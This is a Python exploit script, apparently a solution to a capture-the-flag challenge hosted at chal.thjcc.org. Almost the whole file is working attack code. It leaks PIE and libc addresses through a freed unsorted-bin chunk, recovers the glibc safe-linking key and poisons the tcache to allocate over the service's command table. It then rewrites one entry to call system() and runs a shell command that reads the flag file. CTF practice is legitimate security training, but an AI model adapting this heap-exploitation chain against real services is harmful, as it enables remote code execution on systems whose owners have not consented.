#!/usr/bin/env python3
import os
import re
import socket
import struct
import sys


HOST = os.environ.get("HOST", "chal.thjcc.org")
PORT = int(os.environ.get("PORT", "1024"))

SPECIES_CAT = 0x31EC
COMMAND_TABLE = 0x5020
MAIN_ARENA_UNSORTED = 0x203B20
SYSTEM = 0x58750


def p64(value):
    return struct.pack("<Q", value)


def u64(data):
    return struct.unpack("<Q", data.ljust(8, b"\0")[:8])[0]


class Tube:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=8)
        self.sock.settimeout(8)
        self.buffer = b""

    def send(self, data):
        self.sock.sendall(data)

    def sendline(self, data):
        self.send(data + b"\n")

    def recvuntil(self, delimiter):
        while delimiter not in self.buffer:
            chunk = self.sock.recv(65536)
            if not chunk:
                raise EOFError(f"connection closed before {delimiter!r}")
            self.buffer += chunk
        end = self.buffer.index(delimiter) + len(delimiter)
        result, self.buffer = self.buffer[:end], self.buffer[end:]
        return result

    def recvall(self):
        chunks = [self.buffer]
        self.buffer = b""
        self.sock.settimeout(2)
        while True:
            try:
                chunk = self.sock.recv(65536)
            except socket.timeout:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks)


def command(io, line, expected, body=b""):
    io.sendline(line)
    if body:
        io.send(body)
    response = io.recvuntil(b"\n")
    if expected not in response:
        raise RuntimeError(f"{line!r} failed: {response!r}")
    return response


def admit(io, slot, kind, cap, note=b""):
    line = f"admit {slot} {kind} {cap} {len(note)}".encode()
    command(io, line, b"admitted", note)


def select(io, slot):
    command(io, f"select {slot}".encode(), b"selected")


def release(io, slot):
    command(io, f"release {slot}".encode(), b"released")


def revise(io, data):
    command(io, f"revise {len(data)}".encode(), b"revised", data)


def show(io):
    line = command(io, b"show", b"record:")
    match = re.fullmatch(rb"record: ([0-9a-f]+)\n", line)
    if not match:
        raise RuntimeError(f"malformed record: {line!r}")
    return bytes.fromhex(match.group(1).decode())


def main():
    io = Tube(HOST, PORT)
    banner = io.recvuntil(b"type help for commands\n")
    print(banner.decode(), end="", file=sys.stderr)

    # A large allocation bypasses tcache. A following guard allocation keeps it
    # away from the top chunk so free() places it in the unsorted bin.
    admit(io, 0, 0, 0x4F0)
    admit(io, 1, 0, 0x20)
    select(io, 0)

    live = show(io)
    pie = u64(live[0x18:0x20]) - SPECIES_CAT
    release(io, 0)
    stale_large = show(io)
    libc = u64(stale_large[:8]) - MAIN_ARENA_UNSORTED
    system = libc + SYSTEM
    print(f"[+] PIE    = {pie:#x}", file=sys.stderr)
    print(f"[+] libc   = {libc:#x}", file=sys.stderr)
    print(f"[+] system = {system:#x}", file=sys.stderr)

    # Leak safe-linking from a one-element tcache list, then make a second
    # same-sized chunk the list head and overwrite its encoded next pointer.
    admit(io, 2, 0, 0x38)
    admit(io, 3, 0, 0x38)
    select(io, 2)
    release(io, 2)
    a_key = u64(show(io)[:8])

    select(io, 3)
    release(io, 3)
    encoded_a = u64(show(io)[:8])

    # The two 0x70-sized chunks are consecutive. Handle the rare case where
    # their user pointers straddle a page boundary.
    c_key = None
    for candidate in (a_key, a_key + 1):
        a_addr = encoded_a ^ candidate
        c_addr = a_addr + 0x70
        if a_addr >> 12 == a_key and c_addr >> 12 == candidate:
            c_key = candidate
            break
    if c_key is None:
        raise RuntimeError("could not recover the safe-linking key")

    target = pie + COMMAND_TABLE
    revise(io, p64(target ^ c_key))
    print(f"[+] target = {target:#x}", file=sys.stderr)

    # First allocation consumes the real tcache chunk. The second is returned
    # at the command table; its note recreates one entry as pwn -> system.
    admit(io, 4, 0, 0x38)
    payload = b"\0" * 8 + b"pwn\0".ljust(16, b"\0") + p64(system)
    admit(io, 5, 0, 0x38, payload)

    io.sendline(b'pwn cat "$NECROPET_FLAG_PATH"')
    output = io.recvall()
    sys.stdout.buffer.write(output)

    flag = re.search(rb"THJCC\{[^\r\n}]+\}", output)
    if not flag:
        raise RuntimeError(f"flag not found in response: {output!r}")
    print(f"[+] flag: {flag.group().decode()}", file=sys.stderr)


if __name__ == "__main__":
    main()
